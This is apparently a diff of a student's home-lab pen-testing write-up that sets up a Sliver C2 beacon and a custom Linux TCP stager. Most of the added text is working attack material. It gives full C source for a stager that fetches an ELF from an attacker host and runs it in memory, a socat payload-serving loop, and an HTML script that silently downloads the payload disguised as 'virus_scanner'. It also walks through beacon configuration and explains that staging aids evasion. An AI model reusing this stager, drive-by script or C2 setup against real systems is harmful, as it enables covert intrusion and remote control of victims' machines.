@@ -143,9 +143,11 @@ $ sudo apt update && sudo apt install sliver -y
 $ curl https://sliver.sh/install | sudo bash
 ```
 
-Type `sliver-server` or just `sliver` (depending on your package version) for the interactive console:
+Type `sliver-server` to launch the interactive console:
 
-<img width="1774" height="729" alt="2026-04-30-18:56:52" src="https://github.com/user-attachments/assets/9ea10b53-291b-474c-bc57-dfa3f4998e38" />
+<img width="1770" height="784" alt="2026-05-03-20:24:42" src="https://github.com/user-attachments/assets/21fc7c5e-9e26-48bd-9521-86cdab10c8d7" />
+
+
 
 
 > [!TIP]
@@ -516,7 +518,7 @@ sliver > stage-listener -u tcp://192.168.130.233:80 -p linuxServer
 We just need to specify `URL` and `profile`.
 
 
-The **stage-listener** is used to **serve the remaining shell code**, but we still need the _mtls-listener_ for the _main communication channel_:
+The `stage-listener` is used to **serve the remaining shell code**, but we still need the `mtls-listener` for the **main communication channel**:
 ```console
 sliver > mtls
 
@@ -541,13 +543,13 @@ $ curl https://sliver.sh/install | sudo bash
 ```
 But to no avail...
 
-So I did some digging and stumbled upon some old [source code](<https://github.com/BishopFox/sliver/blob/93e772f5bf81c59ca25033e1d6d40138f615b4b8/client/command/generate/generate-stager.go#L18>) for that specific feature, specifically: `sliver/client/command/generate/generate-stager.go` which had the latest `commit` 4 years ago..
+So I did some digging and stumbled upon some old [source code](<https://github.com/BishopFox/sliver/blob/93e772f5bf81c59ca25033e1d6d40138f615b4b8/client/command/generate/generate-stager.go#L18>) for that specific feature at: `sliver/client/command/generate/generate-stager.go` which had the latest `commit` 4 years ago..
 
 And from the [new source code](<https://github.com/BishopFox/sliver/tree/master/client/command/generate>) at `sliver/client/command/generate/` the same file is **gone**.. BUT, I did find a file `profiles-stage.go` and `implants-stage.go`, so I'm thinking we have to use either one?
 
 
 ## Problem #2
-I found out that sliver doesn't really support staging for linux (no wonder all the material is just windows windows windows), but I did some digging and found a thread to this issue [here](<https://github.com/BishopFox/sliver/issues/1734>). Some guy in the thread had solved this, so I copied the [TCP stager](<https://github.com/BishopFox/sliver/issues/1734#issuecomment-2614045372>) and changes `HOST` to `192.168.130.233` and `PORT` to `8080` and compiled the stager:
+I found out that sliver doesn't really support staging for linux (no wonder all the material is just windows windows windows), but I did some digging and found a thread to this issue [here](<https://github.com/BishopFox/sliver/issues/1734>) (issue number #1734, still open today 02.05.26). Some guy in the thread had solved this, so I copied the [TCP stager](<https://github.com/BishopFox/sliver/issues/1734#issuecomment-2614045372>) and changed `HOST` to `192.168.130.233` and `PORT` to `8080` and compiled the stager:
 ```bash
 $ gcc -static linuxStager.c -o linuxStager
 
@@ -556,13 +558,13 @@ $ rsync -av linuxStager vagrant@192.168.130.202:/home/vagrant
 ```
 
 ## Clean table
-I created a new profile with format: `exe` (The shellcode payload did not work, I tried it)
+I created a new profile with format: `exe` 
 ```console
-# Changed format to 'exe'
-slive > profiles new beacon -m 192.168.130.233 -o linux -f exe -e linuxServerExe
+sliver > profiles new beacon -m 192.168.130.233 -o linux -f exe -e linuxServerExe
 ```
+(The `shellcode` payload did not work, I tried it..)
 
-Create the final payload (beacon implant) with the profile:
+Create the final payload using the profile:
 ```console
 sliver > profiles generate linuxServerExe -s /home/steve/box/sliver/payloads/linuxServerExe
 
@@ -600,14 +602,12 @@ x toggle • ↑ up • ↓ down • / filter • enter submit • ctrl+a select
 ```
 
 
-I executed the `linuxStager` on the victim but nothing happened. I manually transfered the payload and executed it and it worked, we got ourselves a beacon. So I guess not even the listener is working, we spin up our own!
-
-Kill the misbehaving listener
+I executed the `linuxStager` on the victim and it exited immediately, so I thought not even the listener is working as it should... (which we'll confirm in a bit). I had already spent hours upon hours doing this, so I my goal was to just get the whole shabang working. We kill the misbehaving listener and spin up our own!
 ```console
 sliver > jobs -k 3 
 ```
 
-Create a script we can run to server our payload:
+Create a script to act as the payload-server / listener:
 ```bash
 while true; do
 	( 
@@ -616,21 +616,566 @@ while true; do
 	) | socat - TCP-LISTEN:8080,reuseaddr
 done
 ```
-Run the script ->
+**Explained**
+- The `while true` makes sure the listener restarts automatically after each connection
+- `(` starts a subshell so we can pipe multiple commands into one output stream
+- The `printf` line gets the file size of the implant and formats it as an 8 char hex value
+- `xxd -p -r` converts the hex value into raw bytes for transmission
+- `cat`  outputs the raw payload bytes immediately after the size header
+- `)` Ends the subshell
+- `socat` serves the staged payload over `TCP` via port `8080` and rebinds the port after disconnects
+
+
+I borrowed the basics idea from the guy who wrote the TCP stager. It was originally two commands:
+```bash
+$ printf "%08x" "$(stat --format '%s' DISABLED_ABROAD)" | xxd -p -r > DISABLED_ABROAD_staged
+$ cat DISABLED_ABROAD_staged | nc -lvp 80 -s 192.168.45.199
+```
+I created a while loop to act as an active listener and changed `nc` to `socat` because I'm more familiar with that one!
+
+Start the listener:
+```bash
+$ ./stage-listener.sh
+```
+
+And execute the stager on the victim (after a succesful phishing campaign)
+```bash
+vagrant@metasploitable3-ub1404:~$ ./linuxStager 
+vagrant@metasploitable3-ub1404:~$ 
+vagrant@metasploitable3-ub1404:~$ echo $?
+0
+```
+But it exited immediately... Even though the exit code was 0 something was not working properly..
+
+
+## Troubleshooting
+The listener is available:
+
+<img width="985" height="56" alt="2026-05-03-14:24:59" src="https://github.com/user-attachments/assets/766aed58-9b41-449a-9d8a-1435826956c3" />
+
+Okay so maybe the listener is broken? It's after all random code I found on github 😂
+
+So I asked `chatGPT` what modifications to make and it basically told me to delete a few parts. I didn't delete it entirely but rather commented them out and added a few debugging statements of my own (along with the ones chatGPT suggested):
+```C
+#define _GNU_SOURCE
+
+#include <arpa/inet.h>
+#include <fcntl.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/mman.h>
+#include <sys/socket.h>
+#include <unistd.h>
+
+// Change from '/usr/bin/bash' to --> 'stage'
+#define ELF_NAME "stage"
+#define HOST "192.168.130.233"
+#define PORT 8080
+
+int main(void) {
+    /*pid_t pid = fork();
+    if (pid < 0) { return 1; }
+    else if (pid > 0) { return 0; }
+
+    if (setsid() == -1) { return 1; }
+
+    pid = fork();
+    if (pid < 0) { return 1; }
+    else if (pid > 0) { return 0; }
+
+    if (chdir("/") < 0) { return 1; }*/
+
+    //close(STDIN_FILENO);
+    //close(STDOUT_FILENO);
+    //close(STDERR_FILENO);
+
+    /* int fd = open("/dev/null", O_CLOEXEC | O_RDWR);
+    if (fd == -1) { return 1; }
+
+    dup2(fd, STDIN_FILENO);
+    dup2(fd, STDOUT_FILENO);
+    dup2(fd, STDERR_FILENO);
+    if (fd > 2) { close(fd); } */
+
+    int return_value = 1;
+
+    int sd = socket(AF_INET, SOCK_CLOEXEC | SOCK_STREAM, 0);
+    if (sd == -1) { goto ERROR; }
+
+    struct sockaddr_in sa = {0};
+    sa.sin_family = AF_INET;
+    sa.sin_port = htons(PORT);
+
+    if (inet_pton(AF_INET, HOST, &sa.sin_addr) < 1) { goto ERROR_SD; }
+    if (connect(sd, (struct sockaddr *) &sa, sizeof(sa)) == -1) {
+        goto ERROR_SD;
+    }
+    // Add debug
+    printf("connected\n");
+
+    uint32_t elf_size = 0;
+    if (recv(sd, &elf_size, sizeof(elf_size), 0) != sizeof(elf_size)) {
+        goto ERROR_SD;
+    }
+    // Add debug
+    printf("received payload\n");
+
+    elf_size = ntohl(elf_size);
+
+    uint8_t *elf_data = malloc(elf_size);
+    if (!elf_data) { goto ERROR_SD; }
+
+    ssize_t bytes_partial = 0;
+    ssize_t bytes_total = 0;
+    while (bytes_total < elf_size) {
+        bytes_partial = recv(
+            sd, elf_data + bytes_total, elf_size - bytes_total, 0);
+        if (bytes_partial < 1) { goto ERROR_DATA; }
+
+        bytes_total += bytes_partial;
+    }
+
+    int md = memfd_create(ELF_NAME, MFD_CLOEXEC);
+    if (md == -1) { goto ERROR_DATA; }
+
+    bytes_total = 0;
+    while (bytes_total < elf_size) {
+        bytes_partial = write(
+            md, elf_data + bytes_total, elf_size - bytes_total);
+        if (bytes_partial < 1) { goto ERROR_MEMFD; }
+
+        bytes_total += bytes_partial;
+    }
+
+    char *argv[] = {ELF_NAME, NULL};
+    char *envp[] = {NULL};
+
+    // Add debug
+    printf("executing memfd\n");
+
+    if (fexecve(md, argv, envp) == -1) {
+		// Add debug
+        perror("fexecve");
+		goto ERROR_MEMFD;
+    }
+
+    return_value = 0;
+
+ERROR_MEMFD:
+    close(md);
+
+ERROR_DATA:
+    free(elf_data);
+
+ERROR_SD:
+    close(sd);
+
+ERROR:
+    return return_value;
+}
+```
+Recompile and fire away:
+
+```bash
+$ gcc -static linuxStager.c -o linuxStager
+$ rsync -av linuxStager vagrant@192.168.130.202:/home/vagrant
+```
+
+This time we get a little further but execution stops and exits != 0
+```
+vagrant@metasploitable3-ub1404:~$ ./linuxStager 
+connected
+received payload
+vagrant@metasploitable3-ub1404:~$ echo $?
+1
+```
+So I decided to try it locally:
+
+<img width="1049" height="242" alt="2026-05-03-22:39:47" src="https://github.com/user-attachments/assets/e12e3b18-9041-4d7b-b356-adb40f0ff1fa" />
+
+
+And wouldn't you know the **beacon is activated**!
+
+
+<img width="1901" height="166" alt="2026-05-03-22:41:10" src="https://github.com/user-attachments/assets/1fd21c65-0478-4a76-a1cf-b052b24dde3c" />
 
 
 
+### The Final Straw
+I still want to get the stager to work on the victim machine. Maybe the static linking is the problem? Let's try compile it without that flag and send again.
+
+Test the connection:
+
+<img width="1622" height="365" alt="2026-05-03-23:11:55" src="https://github.com/user-attachments/assets/863670c4-3674-4ef8-97fa-f07fdaec0585" />
+
+
+And execute:
+```bash
+vagrant@metasploitable3-ub1404:~$ ./linuxStager 
+./linuxStager: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.27' not found (required by ./linuxStager)
+./linuxStager: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./linuxStager)
+```
+
+I'm guessing the problem is that our target system is too old (ubuntu 14.04) to be executing a payload compiled on a rolling distro like kali.. 😂
+
+So I set out on a hunt and found all available `GCC` [versions](<https://documentation.ubuntu.com/ubuntu-for-developers/reference/availability/gcc/>) for ubuntu. `Ubuntu 14.04` (Trusty Tahr) (our target) uses versions: `4.4`, `4.6`, `4.7`, `4.8`, with `dot8` being the default.
+
+
+I thought the easiest way to go about this this is to mimick the target environment and compile there. To achieve said task I think containers might be the easiest and robust way.
+
+### Workflow
+```bash
+$ docker pull ubuntu:trusty
+$ docker images
+REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
+ubuntu       trusty    13b66b487594   5 years ago   197MB
+
+$ sudo docker run -it 13b66b
+
+root@5803c1e4b917:~# apt update && apt install gcc musl-tools -y
+
+The following NEW packages will be installed:
+   gcc gcc-4.8
+##  Some output redacted, only highlighting what we want!
+
+
+## On the host machine 
+┌──(steve㉿flyingcarpet)-[~/box/sliver/payloads]
+└─$ docker ps       
+CONTAINER ID   IMAGE     COMMAND       CREATED         STATUS         PORTS     NAMES
+5803c1e4b917   13b66b    "/bin/bash"   6 minutes ago   Up 6 minutes             reverent_northcutt
+                                                                                                                              
+┌──(steve㉿flyingcarpet)-[~/box/sliver/payloads]
+└─$ docker cp ./linuxStager.c reverent_northcutt:/root/
+Successfully copied 4.61kB to reverent_northcutt:/root/
+
+## Back in the container:
+
+root@5803c1e4b917:~# musl-gcc -static linuxStager.c -o linuxStager
+linuxStager.c: In function 'main':
+linuxStager.c:80:37: error: 'MFD_CLOEXEC' undeclared (first use in this function)
+     int md = memfd_create(ELF_NAME, MFD_CLOEXEC);
+                                     ^
+linuxStager.c:80:37: note: each undeclared identifier is reported only once for each function it appears in
+```
+It's late and the task has to be given in so don't want to spend too much time debugging, just pasted the problem to chatGPT and asked it to fix it.
+```console
+# It said change -->
+int md = memfd_create(ELF_NAME, MFD_CLOEXEC);
+# TO -->
+int md = memfd_create(ELF_NAME, 0);
+
+# Also noted that
+Older environments may ALSO lack the libc wrapper for:
+memfd_create()
+If that happens next, use the raw syscall instead.
+#include <sys/syscall.h>
+int md = syscall(SYS_memfd_create, ELF_NAME, 0);
+
+# I confirmed the latter issue by recompiling and then I got the exact error it warned about,
+# so we make the necessary modifications and recompile
+
+# Got another issue which we fixed by:
+# Changing int md = syscall(SYS_memfd_create, ELF_NAME, 0);
+# TO -->
+# int md = syscall(319, ELF_NAME, 0);
+
+root@5803c1e4b917:~# musl-gcc -static linuxStager.c -o linuxStager
+root@5803c1e4b917:~# ls
+linuxStager  linuxStager.c
+```
+**Q:** Why did we use `musl` for compiling ?
+
+**A:** During my soul-searching online I stumbled upon [this](<https://lindevs.com/install-musl-gcc-on-ubuntu>) blog post mentioning using musl for building statically linked, lightweight and portable binaries. That sounded good enough for me so I thought why not give it a go 🤷‍♂️
+
+A professional description:
+
+"musl-gcc is a GCC wrapper that compiles programs against musl libc instead of glibc. Musl is a lightweight C standard library designed for static linking and embedded systems. Creates smaller, portable binaries suitable for containers and minimal environments." - [Source](<https://linuxcommandlibrary.com/man/musl-gcc>)
+
+Back on Kali we copy over the reborn stager from the container, drop the sneaky bomb on the victim and start the listener.
+```bash
+┌──(steve㉿flyingcarpet)-[~/box/sliver/payloads]
+└─$ docker cp reverent_northcutt:/root/linuxStager ./linuxStagerOld    
+Successfully copied 26.6kB to /home/steve/box/sliver/payloads/linuxStagerOld
+                                                                                                                              
+┌──(steve㉿flyingcarpet)-[~/box/sliver/payloads]
+└─$ rsync -av linuxStagerOld vagrant@192.168.130.202:/home/vagrant/
+
+┌──(steve㉿flyingcarpet)-[~/box/sliver/payloads]
+└─$ ./stage-listener.sh
+
+```
+
+<img width="1180" height="211" alt="2026-05-04-00:18:28" src="https://github.com/user-attachments/assets/03fd6068-bcff-4c77-a83a-69453745344b" />
+
+
+## TADAAA
+
+I compiled again using `gcc` this time without the `-static` flag and sent it away:
+
+<img width="705" height="187" alt="2026-05-04-00:21:36" src="https://github.com/user-attachments/assets/0443acb7-149c-4576-81bb-7c19785b10ef" />
+
+## :/
+Before moving forward I decided to drop the full payload on the victim and see if would even run:
+
+<img width="797" height="190" alt="2026-05-04-00:25:46" src="https://github.com/user-attachments/assets/87e8e960-c950-4cf3-a0d2-2881c42f2a62" />
+
+And wouldn't you know our `mtls-listener` caught the beacon:
+
+<img width="1912" height="534" alt="2026-05-04-00:26:30" src="https://github.com/user-attachments/assets/684287ee-4b3d-49d5-80c4-7a14fb640b83" />
+
+
+So the problem is with the old ass ubuntu system not being able to handle our stager.. I'll come back to this another time because my time right now is running out.
+
+I shut down the ol box and started another VM. I thought it'd be funny to use the Cisco NetAcad cyber security lab vm so that's what I did. I also fired up the web server on the attacker:
+```bash
+┌──(steve㉿flyingcarpet)-[~/box/sliver/payloads]
+└─$ musl-gcc -static linuxStager.c -o linuxStager   
+
+┌──(steve㉿flyingcarpet)-[~/box/sliver/payloads]
+└─$ cp linuxStager ../html
+
+┌──(steve㉿flyingcarpet)-[~/box/sliver/payloads]
+└─$ cd ../html && vim index.html
+
+┌──(steve㉿flyingcarpet)-[~/box/sliver/html]
+└─$ mv linuxStager virus_scanner                 
+
+┌──(steve㉿flyingcarpet)-[~/box/sliver/html]
+└─$ python3 -m http.server 4343 --directory ./
+Serving HTTP on 0.0.0.0 port 4343 (http://0.0.0.0:4343/) ...
+```
+Because of the script I added to our html page:
+```html
+       	<script>
+		window.onload = function(){
+			var a = document.createElement("a");
+			a.href = "./virus_scanner";
+			a.download = "virus_scanner";
+			a.click();
+		};
+		</script>
+```
+As soon as the victim browses to our site the file is downloaded, don't even have to click anything (..themselves, the script does it for us) 😉:
+
+<img width="1926" height="621" alt="2026-05-04-01:20:08" src="https://github.com/user-attachments/assets/554a43ac-82e3-4ffe-b98f-805af5f73aa0" />
+
+<img width="721" height="113" alt="2026-05-04-01:21:01" src="https://github.com/user-attachments/assets/6ae55855-9cf9-4f4a-9b3d-c39774a1e330" />
 
 
 
+**The moment of truth:**
+```bash
+[analyst@secOps Downloads]$ chmod +x virus_scanner 
+[analyst@secOps Downloads]$ 
+[analyst@secOps Downloads]$ ./virus_scanner 
+[analyst@secOps Downloads]$ echo $?
+1
+```
+Nahh, not yet..
 
-<img width="693" height="519" alt="WIP" src="https://github.com/user-attachments/assets/8a770c06-cc74-4ea6-a679-01db820bf244" />
+I pondered and tinkered a while until I realized it's because we switched away from the vagrant network.. 😂
+
+So I configured the whole shabang again with new connection details:
+```console
+sliver > profiles new beacon -m 192.168.120.233 -o linux -f elf -e linuxServerExe2p0
+
+sliver > profiles generate linuxServerExe2p0 -s ./linuxServerExe2p0
+
+[*] Generating new linux/amd64 beacon implant binary (1m0s)
+[*] Symbol obfuscation is enabled
+[*] Build completed in 1m25s
+[*] Implant saved to /home/steve/box/sliver/payloads/linuxServerExe2p0
+```
+I also edited the `TCP stager`, recompiled it, and changed the payload in the `stage-listener` script.
+
+We go again:
+```bash
+┌──(steve㉿flyingcarpet)-[~/box/sliver/payloads]
+└─$ musl-gcc -static linuxStager.c -o stager     
+                                                                                                                              
+┌──(steve㉿flyingcarpet)-[~/box/sliver/payloads]
+└─$ rsync -av stager analyst@192.168.120.219:/home/analyst/Downloads/
+
+┌──(steve㉿flyingcarpet)-[~/box/sliver/payloads]
+└─$ ./stage-listener.sh
+```
+
+<img width="642" height="180" alt="2026-05-04-02:30:57" src="https://github.com/user-attachments/assets/2a67f2ce-d771-4dda-82a0-d2aab2e58972" />
 
 
 
+## AND THE BEACON IS LIVE
+<img width="1889" height="332" alt="2026-05-04-02:31:57" src="https://github.com/user-attachments/assets/2e761153-c198-48ce-bf47-99b5c25dc6c5" />
+
+Immediately configure `callback time` to `5s` and `jitter` to `1s`:
+```console
+sliver (BIZARRE_CLARINET) > reconfig -i 5s -j 1s
+[*] Tasked beacon BIZARRE_CLARINET (42fef21f)
+
+# waiting.....
+
+[+] BIZARRE_CLARINET completed task 42fef21f
+
+[*] Reconfigured beacon
+
+sliver (BIZARRE_CLARINET) > env
+[*] Tasked beacon BIZARRE_CLARINET (6563d8d6)
+
+# wait ...
+
+[+] BIZARRE_CLARINET completed task 6563d8d6
+```
+
+<img width="1918" height="788" alt="2026-05-04-02:53:50" src="https://github.com/user-attachments/assets/ca69fb08-5eb3-4531-8fdf-8236b7b64acb" />
+
+
+## Q: Why go through all the trouble?
+Because we effectively have a very small TCP payload stager that is able to fetch payloads we determine, and then execute them in memory. No writing heavy payloads to disk!
+
+Also, the beacon allows us the hide better in the network. A persistent connection would be flagged pretty quickly. However, come the day we need a persistent connection, we can simply give the `interactive` command, background the beacon and use the session instead:
+
+```console
+sliver (BIZARRE_CLARINET) > interactive
+[*] Using beacon's active C2 endpoint: mtls://192.168.120.233:8888
+[*] Tasked beacon BIZARRE_CLARINET (98a8e804)
+
+[*] Session d7624b7b BIZARRE_CLARINET - 192.168.120.219:49664 (labvm) - linux/amd64 - Mon, 04 May 2026 02:56:48 EEST
+
+sliver (BIZARRE_CLARINET) > background
+[*] Background ...
+```
+<img width="1853" height="404" alt="2026-05-04-03:02:22" src="https://github.com/user-attachments/assets/c1d7836b-b371-47c2-98fe-fab98bb172f2" />
+
+```
+sliver > use d7624b7b
+
+[*] Active session BIZARRE_CLARINET (d7624b7b-9531-4b40-a4b6-77ef89347696)
+```
+<img width="897" height="1021" alt="2026-05-04-03:00:57" src="https://github.com/user-attachments/assets/67fc8184-4c01-4c83-b1d2-a5a91b1bd3b7" />
 
 
 
+## Comparison
+I decided to do a small comparison before signing out. I compiled the TCP stager 3 different ways:
+```console
+17K   Gstager_dynamic
+791K  Gstager_static
+40K   Mstager_static
+```
+`Gstager` => Compiled using `gcc` // `Mstager` => compiled using `musl-gcc`
+
+The winner in size is `dynamically linked` `glibc`, which is obvious as you don't have to pack all dependencies. But when you compare the statically linked binaries, `musl` is the **clear** winner here `40K` < `719K`. It's also more self-contained!
+
+Oh btw, the final `TCP stager` (Linux edition) source code for anyone interested
+Credit to [this guy](<https://github.com/BishopFox/sliver/issues/1734#issuecomment-2614045372>) for getting me started!:
+```C
+#define _GNU_SOURCE
+
+#include <arpa/inet.h>
+#include <fcntl.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/mman.h>
+#include <sys/socket.h>
+#include <unistd.h>
+
+#define ELF_NAME "stage"
+#define HOST "192.168.120.233"
+#define PORT 8080
+
+int main(void)
+{
+    int return_value = 1;
+
+    int sd = socket(AF_INET, SOCK_CLOEXEC | SOCK_STREAM, 0);
+    if (sd == -1) {
+		goto ERROR;
+	}
+
+    struct sockaddr_in sa = {0};
+    sa.sin_family = AF_INET;
+    sa.sin_port = htons(PORT);
+
+    if (inet_pton(AF_INET, HOST, &sa.sin_addr) < 1) { goto ERROR_SD; }
+    if (connect(sd, (struct sockaddr *) &sa, sizeof(sa)) == -1) {
+        goto ERROR_SD;
+    }
+    // Add debug
+    printf("connected\n");
+    fflush(stdout);
+
+    uint32_t elf_size = 0;
+    if (recv(sd, &elf_size, sizeof(elf_size), 0) != sizeof(elf_size)) {
+        goto ERROR_SD;
+    }
+    elf_size = ntohl(elf_size);
+
+    uint8_t *elf_data = malloc(elf_size);
+    if (!elf_data) {
+		goto ERROR_SD;
+	}
+
+    ssize_t bytes_partial = 0;
+    ssize_t bytes_total = 0;
+    while (bytes_total < elf_size) {
+        bytes_partial = recv(
+            sd, elf_data + bytes_total, elf_size - bytes_total, 0);
+        if (bytes_partial < 1) { goto ERROR_DATA; }
+
+        bytes_total += bytes_partial;
+    }
+    // Add debug
+    printf("received payload\n");
+    fflush(stdout);
+
+    int md = memfd_create(ELF_NAME, 0);
+    if (md == -1) { 
+	perror("memfd_create");
+	goto ERROR_DATA; 
+    }
+    // Add debug
+    printf("created memfd\n");
+    fflush(stdout);
+
+    bytes_total = 0;
+    while (bytes_total < elf_size) {
+        bytes_partial = write(
+            md, elf_data + bytes_total, elf_size - bytes_total);
+        if (bytes_partial < 1) { goto ERROR_MEMFD; }
+
+        bytes_total += bytes_partial;
+    }
+
+    char *argv[] = {ELF_NAME, NULL};
+    char *envp[] = {NULL};
+
+    lseek(md, 0, SEEK_SET);
+
+    // Add debug
+    printf("executing...\n");
+    fflush(stdout);
+	
+    if (fexecve(md, argv, envp) == -1) {
+		// Add debug
+        perror("fexecve");
+		goto ERROR_MEMFD;
+    }
+
+    return_value = 0;
+
+ERROR_MEMFD:
+    close(md);
+ERROR_DATA:
+    free(elf_data);
+ERROR_SD:
+    close(sd);
+ERROR:
+    return return_value;
+}
+```
 
 **Help received**
 - Sliver C2 | Stagers, Payload Types (Staged vs Stageless), Creating & Running Staged Payloads ([video](<https://www.youtube.com/watch?v=BYnk0jB671k>))
@@ -669,3 +1214,28 @@ Run the script ->
 
 
 
+------------------
+
+
+
+
+# Src & Ref
+In Order of Appearance
+- <https://github.com/rapid7/metasploitable3>
+- <https://github.com/Ali-Mikael/Pen-testing/blob/main/h3-EternalExploit.md#setting-up>
+- <https://sliver.sh/>
+- <https://www.geeksforgeeks.org/html/how-to-link-pages-in-html/>
+- <https://sliver.sh/docs>
+- <https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status/204>
+- <https://www.cloudflare.com/learning/access-management/what-is-mutual-tls/>
+- <https://encyclopedia.kaspersky.com/glossary/stager/>
+- <https://blog.retracelabs.io/posts/stager101/stagers-101/>
+- <https://github.com/BishopFox/sliver/blob/93e772f5bf81c59ca25033e1d6d40138f615b4b8/client/command/generate/generate-stager.go#L18>
+- <https://github.com/BishopFox/sliver/tree/master/client/command/generate>
+- <https://github.com/BishopFox/sliver/issues/1734>
+- <https://github.com/BishopFox/sliver/issues/1734#issuecomment-2614045372>
+- <https://documentation.ubuntu.com/ubuntu-for-developers/reference/availability/gcc/>
+- <https://lindevs.com/install-musl-gcc-on-ubuntu>
+- <https://linuxcommandlibrary.com/man/musl-gcc>
+- <https://github.com/BishopFox/sliver/issues/1734#issuecomment-2614045372>
+- <https://www.youtube.com/watch?v=BYnk0jB671k>
